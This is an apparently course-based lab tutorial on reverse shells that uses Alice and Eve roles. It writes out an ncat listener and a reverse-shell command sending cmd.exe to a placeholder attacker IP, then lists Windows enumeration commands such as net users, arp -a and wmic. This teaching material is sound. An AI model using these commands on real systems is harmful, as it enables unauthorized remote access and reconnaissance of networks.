---
layout: editorial
---

# Reverse Shell

## Objective

Learn how attackers can bypass firewalls when there is no direct communication from the attacker’s computer to the victim’s computer.

## Discussion

In this scenario, the attacker has control over their computer so that is why the attacker disables their firewall. It is to simulate the attacker can decide which port to use and open on their system.

This attack is how phishing campaigns work that trick someone into opening a document and the attacker obtains a shell on their computer. The victim is behind a corporate firewall so Even CANNOT connect directly to Alice. Instead, Alice is tricked into opening a document that connects back to Eve’s computer.

## Scenario

Alice is behind a firewall so Eve can't connect directly to her computer.

## Preparation

1. **Alice, change your Windows 10 Network Adapater and set it back to your **_**LAN**_** segment.**
2. **Alice enable your Windows 10 firewall.**
3. **Eve, keep your Windows 10 Network Adapater on the NETSEC-WAN segment.**

**NOTE: When you switch roles, don’t forget to change your network adapters accordingly.**

## Starting the Lab

Eve will start her listener:

Eve (run the command): **ncat -l 8080 -vv**

Alice connects to Eve and gives her computer’s command prompt to Eve. The \*\*-e \*\*means execute. In this case, when Alice connects to Eve, Alice will execute the command **cmd.exe** and push the (command prompt aka shell) over to Eve.

Alice: **ncat -vv X.X.X.X 8080 -e cmd.exe**

Eve should see something like this on her screen:

**Microsoft Windows \[Version 6.1.7601]**

**Copyright (c) 2009 Microsoft Corporation. All rights reserved.**

**c:\Program Files\Nmap>**

You can check by typing:

**ipconfig**

and it should print the IP address of Alice’s computer.

Type some other commands used to enumerate a remote computer. NOTE: Don’t type the # and test. Type the commands in bold.

## Get the list of local users

**net users**

## Enumerate other hosts

**net view**

## Enumerate users on the domain

**net users /DOMAIN**

## List running processes

**tasklist**

## List of services

**tasklist /svc**

## hosts communicated with allows enumeration of the internal systems without special tools like nmap

**arp -a**

## Get installed software versions

## WMIC commands may take a few seconds to show output

**wmic product get name, version, installlocation**

## Running process details

**wmic process**

## OS Details

**wmic os**

## User account details

**wmic useraccount**

## Detailed host information

**systeminfo**

All the commands you are running is part of the process of **enumeration**. If an attacker can run these types of arbitrary commands, they are beginning the process of scoping out your organization.

**BE SURE YOU UNDERSTAND HOW THIS WORKS.**

This evades most firewalls because most firewalls are configured to allow any outbound traffic. Since Eve controls the computer on her end, she can allow Alice to connect to any port on her computer. Even if Alice is behind a restrictive firewall that allows port 80 outbound, Eve can allow her to connect to her computer on Port 80 using the same commands above, except 8080 will become 80.

This is similar to how Malware works. It executes a command and connects back to the attacker's computer system. Just as in the command above, the malware can push the victim's shell back to the attacker.
